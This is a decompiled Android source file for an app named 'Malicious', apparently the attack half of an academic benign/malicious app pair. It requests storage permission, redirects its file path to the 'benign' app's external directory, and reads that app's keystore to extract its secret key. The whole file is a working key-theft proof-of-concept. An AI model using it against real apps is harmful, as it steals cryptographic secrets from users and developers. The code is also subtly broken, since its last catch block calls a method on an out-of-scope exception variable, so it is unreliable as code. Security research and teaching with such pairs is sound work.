package edu.ksu.cs.malicious;

import android.os.Bundle;
import android.os.Process;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.KeyStore;
import java.security.KeyStore.SecretKeyEntry;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableEntryException;
import java.security.cert.CertificateException;
import javax.crypto.SecretKey;

public class MainActivity
  extends AppCompatActivity
{
  public static int REQ_CODE = 101;
  private static String TAG = "Malicious";
  static SecretKey secretKey = null;
  
  public MainActivity() {}
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131296283);
    if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", Process.myPid(), Process.myUid()) == 0)
    {
      readFromKeyStore();
      return;
    }
    int i = REQ_CODE;
    ActivityCompat.requestPermissions(this, new String[] { "android.permission.READ_EXTERNAL_STORAGE" }, i);
  }
  
  public void onRequestPermissionsResult(int paramInt, String[] paramArrayOfString, int[] paramArrayOfInt)
  {
    if (paramInt == REQ_CODE)
    {
      if ((paramArrayOfInt.length > 0) && (paramArrayOfInt[0] == 0))
      {
        Log.d(TAG, "Permission granted.");
        readFromKeyStore();
        return;
      }
      throw new RuntimeException("Permission denied.");
    }
    Log.d(TAG, "Not the expected request result.");
  }
  
  void readFromKeyStore()
  {
    TextView localTextView = (TextView)findViewById(2131165275);
    Object localObject1 = new File(getExternalFilesDir(null), "secretKeyStore").getAbsolutePath();
    String str = ((String)localObject1).replace("edu.ksu.cs.malicious", "edu.ksu.cs.benign");
    Object localObject2 = TAG;
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append("Absolute Path = ");
    localStringBuilder.append((String)localObject1);
    Log.d((String)localObject2, localStringBuilder.toString());
    localObject1 = TAG;
    localObject2 = new StringBuilder();
    ((StringBuilder)localObject2).append("Modified Path = ");
    ((StringBuilder)localObject2).append(str);
    Log.d((String)localObject1, ((StringBuilder)localObject2).toString());
    try
    {
      localObject1 = KeyStore.getInstance(KeyStore.getDefaultType());
      ((KeyStore)localObject1).load(new FileInputStream(new File(str)), null);
      secretKey = ((KeyStore.SecretKeyEntry)((KeyStore)localObject1).getEntry("SECRET_KEY", null)).getSecretKey();
      localTextView.setText("Successfully retrieved the key.");
      Log.d(TAG, "Successfully retrieved the key.");
      return;
    }
    catch (KeyStoreException|CertificateException|NoSuchAlgorithmException|IOException localKeyStoreException)
    {
      localKeyStoreException.printStackTrace();
      throw new RuntimeException(localKeyStoreException);
    }
    catch (UnrecoverableEntryException localUnrecoverableEntryException)
    {
      localUnrecoverableEntryException.printStackTrace();
      localKeyStoreException.setText("Failed to retrieve the key.");
      Log.d(TAG, "Failed to retrieve the key.");
    }
  }
}
